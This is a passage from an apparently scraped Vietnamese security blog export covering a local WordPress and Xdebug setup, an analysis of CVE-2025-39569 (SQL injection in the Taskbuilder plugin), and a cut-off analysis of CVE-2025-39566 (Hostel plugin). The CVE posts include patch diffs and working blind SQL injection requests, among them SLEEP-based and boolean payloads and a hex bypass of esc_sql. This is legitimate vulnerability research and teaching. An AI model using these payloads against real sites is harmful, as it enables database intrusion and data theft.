domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Tải lại cấu hình mới mà không cần dừng server Configure database WordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu:\nBài viết, trang, menu Người dùng, mật khẩu (hash) Cấu hình site Plugins, themes settings Mở MySQL với quyền root:\nsudo mysql -u root Cấu hình MySQL:\n-- Tạo database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Tạo user riêng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cấp quyền cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- Làm mới lại quyền mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Thoát mysql\u0026gt; quit Bye Khởi động lại dịch vụ:\nsudo service mysql start Configure WordPress to connect to the database Copy file cấu hình mẫu:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi tải về có sẵn file wp-config-sample.php Bạn copy nó thành wp-config.php để làm file cấu hình chính cho site Chỉnh sửa thông tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Đây là 3 dòng thay thế text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tên DB đã tạo ở bước trước) username_here =\u0026gt; wordpress (user MySQL đã tạo) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password đã set) Khi Apache chạy WordPress, nó sẽ đọc file này để biết dùng user nào + DB nào để kết nối MySQL Thêm Secret Keys và Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php 👉 Đây là chuỗi bí mật mà WordPress dùng để:\nMã hóa session cookies Sinh ra token (nonce) chống CSRF Ngăn chặn tấn công kiểu “known secret” (ví dụ kẻ tấn công đoán được secret mặc định để giả mạo login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay đổi nó bằng các chuỗi random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cập http://localhost, đặt site title, username, password, email cho user admin\nSetup Debug on VSCode Để hiểu được luồng của trang web chạy và xử lí ở mỗi request, ta cần phải debug nó.\nAdd PHP Debug extension on VS Code Vào Extensions (Ctrl+Shift+X) =\u0026gt; tìm PHP Debug (by Felix Becker) =\u0026gt; Install. Extension này kết nối với Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiểm tra cài chưa:\nphp -v Nếu có dòng with Xdebug v3.x.x nghĩa là đã OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Thêm vào cuối file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port mặc định mới của Xdebug v3 là 9003.\nSau đó restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Mở thư mục chứa trang web wordpress bằng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; tạo file launch.json với nội dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: ánh xạ thư mục trong container/server (/srv/www/wordpress) về thư mục local của trong VS Code.\nNhư vậy là đã hoàn thành setup WordPress trên local kết hợp Debug nó trên VSCode.\nExtend Required Version Mỗi phiên bản WordPress thường đi kèm 1 phiên bản PHP thích hợp. Nên kiểm tra tính tương thích này để quá trình setup không bị lỗi.\nWordPress Auto Update Từ WordPress 3.7 trở đi (2013), WordPress có cơ chế tự động cập nhật (automatic background updates) cho:\nBản vá bảo mật (security release). Bản bảo trì (maintenance release). Không tự động update major version (trừ khi bật rõ ràng). Hệ thống kiểm tra với server api.wordpress.org để xem có bản vá nào mới sẽ tự động nâng cấp background lên. Việc này diễn ra rất nhanh sau khi setup, nên bạn thấy code đổi khác so với source gốc.\nQuá trình setup diễn ra khi truy cập /wp-admin/install.php\nĐể vô hiệu hóa cơ chế cập nhật tự động này, thêm dòng sau vào wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Mặc định, WordPress phụ thuộc vào cấu hình PHP (upload_max_filesize, post_max_size, và đôi khi cả max_execution_time) để xác định dung lượng file tối đa có thể upload. Trên nhiều hosting, giới hạn này chỉ khoảng 2MB – 8MB, không đủ cho các plugin hiện đại.\nWhy Increase the Limit? Plugin dung lượng lớn: Các plugin như WooCommerce extension, page builder, backup, hoặc security suite có thể nặng 20MB – 100MB.\nTránh lỗi upload: Nếu file .zip lớn hơn giới hạn, bạn sẽ gặp lỗi:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Hoặc upload thất bại. Thuận tiện cho quản trị viên: Có thể cài trực tiếp qua Dashboard mà không cần FTP/SSH.\nHỗ trợ phát triển plugin: Plugin tự viết kèm nhiều thư viện/asset có thể khá nặng, việc tăng giới hạn giúp test dễ dàng hơn.\nHow to Increase Plugin Upload Size Sửa php.ini (nếu có quyền server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sửa file .htaccess (nếu dùng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Thêm vào wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 Lời khuyên: Chỉ nên đặt giới hạn vừa đủ (64MB hoặc 128MB). Tránh đặt quá lớn để hạn chế nguy cơ bị upload file nặng gây quá tải server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e là một hệ thống quản lý nội dung (CMS) mạnh mẽ và phổ biến nhất cho phép bạn tạo, quản lý và tùy chỉnh các trang web và blog một cách dễ dàng. Nó là open-source CMS, được xây dựng trên PHP và sử dụng cơ sở dữ liệu MySQL hoặc Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa đời năm 2003, ban đầu chỉ để viết blog, sau đó phát triển thành nền tảng tạo website, cửa hàng online, diễn đàn, landing page…\u003c/li\u003e\n\u003cli\u003eHiện nay, hơn 40% website trên thế giới chạy bằng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCó 2 phiên bản WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Lỗ hổng xảy ra trên plugin Taskbuilder của WordPress trước phiên bản 4.0.2. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) và v4.0.2(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng đã xử lý dữ liệu đầu vào trước khi đưa vào câu SQL. Tuy nhiên, trong quá trình xây dựng truy vấn, giá trị này được chèn trực tiếp mà không được bao trong dấu nháy đơn '...'. Điều đó khiến kẻ tấn công có thể chèn thêm các thành phần cú pháp SQL hợp lệ (như OR, AND,...) vào truy vấn, dẫn đến lỗ hổng SQL Injection.\nPatch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/admin/projects/get_users.php\nTrong phiên bản v4.0.1, biến $proj_id sau khi escape được đưa thẳng vào câu truy vấn mà không có dấu nháy đơn bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\nỞ bản v4.0.2, truy vấn đã được điều chỉnh bằng cách đặt $proj_id trong dấu nháy đơn sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nBản vá này đảm bảo rằng giá trị $proj_id sau khi escape được coi là một chuỗi literal, không thể thoát ra khỏi dấu nháy đơn để chèn thêm cú pháp SQL, qua đó ngăn chặn tấn công SQL Injection.\nHow it work? File architecture:\nCấu trúc chung của file hiện tại\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Bắt đầu buffer để tạo nội dung chính (body) của modal ob_start(); // ... render HTML danh sách users $body = ob_get_clean(); // Bắt đầu buffer để tạo phần footer của modal ob_start(); // ... render HTML các nút thao tác (Close, Save) $footer = ob_get_clean(); // Trả dữ liệu JSON để frontend hiển thị modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: Lấy dữ liệu project từ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vì xuất trực tiếp, giúp gom nội dung vào biến. $body / $footer: Chứa nội dung HTML động của modal. json_encode(): Trả JSON cho client, có khả năng được sử dụng trong Ajax để hiển thị modal mà không cần refresh trang. File nằm trong thư mục includes cho thấy rằng nó sẽ được gọi ở 1 chức năng nào đó ở nơi khác. Để biết chức năng nào sử dụng nó, ta tìm kiếm với từ khóa get_users.php trong thư mục chứa plugin.\n👉 Nó được include trong hàm wppm_get_users() của class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() là callback của action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() là một Plugin API của WordPress, cho phép gắn một callback vào một action hook. wp_ajax_wppm_get_users là tên hook Ajax, với quy tắc đặt tên: wp_ajax_{action} =\u0026gt; Xử lý Ajax khi user đã đăng nhập. wp_ajax_nopriv_{action} =\u0026gt; Xử lý Ajax khi user chưa đăng nhập. Ở đây, action = wppm_get_users. Nghĩa là nếu trong Ajax request bạn gửi action=wppm_get_users tới admin-ajax.php, thì WordPress sẽ tìm callback tương ứng để xử lý, ở đây là wppm_get_users(). 👉 Ta đã biết được action = wppm_get_users, kiểm tra xem Ajax nào sử dụng action này bằng cách tìm từ khóa wppm_get_users trên các file .js trong thư mục chứa plugin.\nAction wppm_get_users là phần data trong request POST của hàm wppm_get_users()\nHàm wppm_get_users() sẽ được đặt trong HTML attribute của chức năng project\nTạo project mới Truy cập vào project đó Inspect code và tìm hàm wppm_get_users sẽ được đặt ở đâu, hành động nào sẽ gọi nó 👉 Khi click vào icon bên cạnh Users ajax sẽ hoạt động, gửi request đến server, lấy danh sách các user tham gia project và mã HTML hiển thị nó.\nExploit Detect SQLi Bắt request bằng BurpSuite, gửi request với SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thời gian phản hồi bị delay =\u0026gt; SQL Injection thành công.\nGet First Letter of Database Name Điều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được.\nGửi request với SQLi payload boolean base vói proj_id đúng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name được tôi đặt tên là wordpress nên kí tự đầu tiên là w tương ứng với mã HEX là 0x77 {: .prompt-info }\nSử dụng SUBSTRING(STRING,1,1) để lấy kí tự đầu tiên của chuỗi\nỞ đây, $proj_id bằng 4 vì SUBSTRING('wordpress',1,1)=0x77 là đúng nên SELECT lấy giá trị đúng trong IF(condition, value if true, value if false), 4 là giá trị có thực trong database, nên response trả về chứa danh sách người tham gia dự án\nSử dụng HEX technique để bypass hàm esc_sql() ở trên, dùng để so sánh khi không sử dùng được '\nGửi request với SQLi payload boolean base vói proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Với proj_id không có thực trong database, response sẽ trả về kết quả chứa None\n👉 Ta đã lấy được kí tự đầu tiên của database name bằng kỹ thuật boolean base\nproj_id đùng: response không chứa None proj_id sai: response chứa None Có thể sử dụng kỹ thuật time base nhưng khi dump số lượng lớn data, thời gian dump sẽ rất lâu {: .prompt-info }\nConclusion Lỗ hổng CVE-2025-39569 trong plugin WordPress Taskbuilder xuất phát từ việc thiếu dấu nháy đơn '...' bao quanh dữ liệu đầu vào trong câu lệnh SQL, khiến dữ liệu người dùng có thể được diễn giải như một phần của câu lệnh SQL hợp lệ.\nBản vá ở phiên bản 4.0.2 đã khắc phục vấn đề bằng cách đưa $proj_id vào trong '...', đảm bảo nó luôn được xử lý như một literal string trong SQL.\nKey takeaways:\nƯu tiên sử dụng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vì tự chèn dữ liệu vào query. Đối với các plugin WordPress, cần test kỹ lưỡng các Ajax endpoint vì đây là nơi dễ xuất hiện SQLi và XSS nhất. Người quản trị cần thường xuyên cập nhật plugin/theme để nhận bản vá kịp thời. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eLỗ hổng xảy ra trên plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e của WordPress trước phiên bản \u003cstrong\u003e4.0.2\u003c/strong\u003e. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) và v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eỨng dụng đã \u003cstrong\u003exử lý dữ liệu đầu vào\u003c/strong\u003e trước khi đưa vào câu SQL. Tuy nhiên, trong quá trình xây dựng truy vấn, giá trị này được chèn trực tiếp mà không được bao trong dấu nháy đơn \u003ccode\u003e'...'\u003c/code\u003e. Điều đó khiến kẻ tấn công có thể chèn thêm các thành phần cú pháp SQL hợp lệ (như \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vào truy vấn, dẫn đến lỗ hổng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lỗ hổng trong plugin Hostel trước phiên bản 1.1.5.7. Do việc làm sạch dữ liệu không đúng cách, điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu, bao gồm không giới hạn ở việc đánh cắp thông tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) và v1.1.5.7(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version Analysis Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ GET request vào SQL query mà cơ chế kiểm soát không chặt chẽ.\nPatch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file controllers/bookings.php\nBản lỗ hổng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Bản vá:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 Bản vá sử dụng whitelist để giới hạn các cột có thể được sắp xếp, nếu không hợp lệ trả về 'tB.id'.\nAnalysis: Lỗ hổng xuất hiện khi param ob được truyền trực tiếp vào mệnh đề ORDER BY thông qua hàm sanitize_text_field(), chỉ escape mà không filter SQLi.\nHow it work? Để inject được, ta cần phải xác định toàn bộ câu query được được sử dụng ở đây\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); Câu query nằm trong nhánh default của cấu trúc switch.\nToàn bộ đoạn xử lý naỳ thuộc về hàm static manage() của class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiếp với core thông qua Plugin API (Hook System). Do đó, để xác định nơi hàm manage() được gọi, ta có thể tìm kiếm từ khóa \u0026quot;manage\u0026quot; trong thư mục chứa plugin.\nTrong file models/hostel.php ta có hàm:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Ở đây:\nadd_menu_page() tạo menu chính trong Admin Dashboard. add_submenu_page() thêm các submenu con cho menu đó. Tham số $callback là một callback function sẽ được gọi khi người dùng click vào menu/submenu. Ví dụ:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Tất cả menu/submenu này đều được đăng ký bên trong hàm static menu() của class WPHostel. Do đó, để xác định nơi hàm menu() được gọi, ta có thể tìm kiếm từ khóa menu trong thư mục chứa plugin.\nTrong file hostel.php ở thư mục gốc của plugin ta có:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() là một Plugin API của WordPress, cho phép gắn một callback vào một action hook. Hook name ở đây là admin_menu, nghĩa là hàm WPHostel::menu() sẽ được gọi trong vòng đời khi WordPress dựng Admin Dashboard Menu. Menu trên UI Admin Dashboard\nDebugging\nChức năng bị lỗi nằm trong Booking Manager, vì vậy ta truy cập vào submenu Manager Bookings trên UI Admin Dashboard. Ngay trước nhánh default có comment // list bookings =\u0026gt; cho thấy đoạn code này xử lý việc liệt kê và sắp xếp bookings Mở debugger: Click Run with Debugger. Đặt breakpoint tại nhánh switch chứa code lỗi và tại dòng code gây lỗi. Khi click vào một cột trong bảng bookings, quan sát: Debugger nhảy vào cấu trúc switch. Dùng Step Over, debugger đi tiếp vào nhánh default. Tiếp tục Step Over và theo dõi giá trị biến trong tab Variables \u0026gt; Locals. Các biến này sẽ kết hợp để tạo thành câu SQL bên dưới. Sau khi ghép các biến, câu query đầy đủ có dạng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Đáng chú ý, biến $orderby được gán như sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Ở đây có điểm bất thường:\nPhần sau ORDER BY sử dụng sanitize_text_field(). Hàm này chỉ làm sạch HTML, không hề filter hoặc validate để đảm bảo an toàn trong SQL context. Tham số ob (do người dùng truyền vào) vì vậy có thể bị lợi dụng để chèn trực tiếp vào câu SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tách mệnh đề ORDER BY bằng , vì nó chấp nhập multi column\nKết quả: thời gian phản hồi bị delay =\u0026gt; SQL Injection thành công.\nDump Data from Database Bypass ' using ORD():\nĐể dump dữ liệu của database ta cần thử để lấy ký tự đầu tiên của database name.\nDo sanitize_text_field() loại bỏ ', ta không dùng được payload so sánh trực tiếp. Thay vào đó dùng ORD() để so sánh ký tự theo ASCII:\nGET 